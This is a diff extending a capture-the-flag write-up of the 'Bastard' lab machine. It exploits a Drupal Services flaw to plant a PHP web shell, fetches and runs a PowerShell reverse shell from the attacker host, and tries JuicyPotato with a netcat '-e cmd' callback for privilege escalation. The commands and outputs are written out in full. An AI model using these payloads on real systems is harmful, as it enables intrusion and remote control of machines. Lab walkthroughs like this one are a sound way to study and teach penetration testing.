@@ -23,3 +23,92 @@ Drupal < 7.58 - 'Drupalgeddon3' (Authenticate | php/webapps/44557.rb
 The ruby script requires metasploit and so we skip it.
 The php script has thre stage exploitation. We visit http://10.10.10.9/rest and get success message back:
 Services Endpoint "rest_endpoint" has been setup successfully.
+
+I mirror the php exploit and add a template that will allow RCE as below :
+$url = 'http://10.10.10.9';
+$endpoint_path = '/rest';
+$endpoint = 'rest_endpoint';
+
+$file = [
+    'filename' => 'exploit.php',
+    'data' => '<?php echo system($_REQUEST["cmd"]); ?>'
+];
+
+And the run the script php 41564.php
+└─# php 41564.php 
+Stored session information in session.json
+Stored user information in user.json
+Cache contains 7 entries
+File written: http://10.10.10.9/exploit.php
+
+And now visiting http://10.10.10.9/exploit.php we can add parameters like http://10.10.10.9/exploit.php?cmd=whoami
+And get back nt authority\iusr nt authority\iusr
+And now onwards to get a reverse shell:
+└─# tail Invoke-PowerShellTcp.ps1 
+        }
+    }
+    catch
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+        Write-Error $_
+    }
+}
+
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 4455
+
+And set up a netcat listener: nc -lvnp 4455; Then set up a local server python3 -m http.server
+And upload and execute the nishang script:
+http://10.10.10.9/exploit.php?cmd=powershell+IEX(New-Object+Net.WebClient).DownloadString('http%3a//10.10.14.4%3a8000/Invoke-PowerShellTcp.ps1')
+And that way user flag spawned:
+PS C:\Users\dimitris\desktop> dir
+
+
+    Directory: C:\Users\dimitris\desktop
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-ar--         19/3/2017   8:06 ??         32 user.txt                          
+
+
+PS C:\Users\dimitris\desktop> type user.txt
+ba22fde1932d06eb76a163d312f921a2
+==========================================
+Privelege Escalation
+==========================================
+PS C:\Users\Administrator> systeminfo
+
+Host Name:                 BASTARD
+OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
+OS Version:                6.1.7600 N/A Build 7600
+System Type:               x64-based PC
+Logon Server:              N/A
+Hotfix(s):                 N/A
+
+PS C:\Users\Administrator> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name          Description                               State  
+======================= ========================================= =======
+SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
+SeImpersonatePrivilege  Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege Create global objects                     Enabled
+
+Since SeImpersonatePrivilege is enabled, we can run juicy potato exploit here.
+
+Opening up smb share:
+└─# python3 ./smbserver.py share /home/joe/Downloads/htb/oscp/windows/bastard -smb2support
+PS C:\inetpub\drupal-7.54> net use Z: \\10.10.14.4\share
+The command completed successfully.
+
+PS C:\inetpub\drupal-7.54> cd Z:
+PS Z:\> dir
+PS Z:\> .\JuicyPotato.exe -t * -l 9000 -p nc64.exe -a "-e cmd 10.10.14.4 4444"
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 9000
+COM -> recv failed with error: 10038
+
+PS Z:\> powershell -ExecutionPolicy Bypass -File Sherlock.ps1
+
+
